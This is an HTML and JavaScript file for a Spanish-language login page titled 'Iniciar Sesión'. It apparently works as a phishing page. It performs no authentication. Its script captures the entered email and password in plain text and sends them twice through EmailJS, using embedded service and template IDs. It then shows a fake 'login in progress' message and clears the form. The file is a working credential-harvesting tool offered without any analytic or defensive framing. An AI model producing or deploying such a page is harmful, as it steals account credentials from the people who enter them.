<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .container h1 {
            margin-top: 0;
            color: #333;
        }
        .container label {
            display: block;
            margin: 10px 0 5px;
        }
        .container input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Inicia sesión para continuar</h1>
        <form id="contact-form">
            <label for="email">Correo Electrónico:</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Iniciar Sesión</button>
        </form>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init('vXFL1_J2AhuYYvCSx');

            document.getElementById('contact-form').addEventListener('submit', function(event) {
                event.preventDefault();

                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;

                if (email && password) {
                    // data
                    var templateParams = {
                        email: email,
                        password: password
                    };

                    // first email
                    emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
                        .then(function(response) {
                            console.log('Inicio de sesión en curso...', response);
                        }).catch(function(error) {
                            console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
                        });

                    // second email
                    emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
                        .then(function(response) {
                            console.log('Inicio de sesión en curso...', response);
                        }).catch(function(error) {
                            console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
                        });

                    alert('Inicio de sesión en curso...');
                    document.getElementById('contact-form').reset();
                } else {
                    alert('Por favor, completa todos los campos para iniciar sesión.');
                }
            });
        })();
    </script>
</body>
</html>
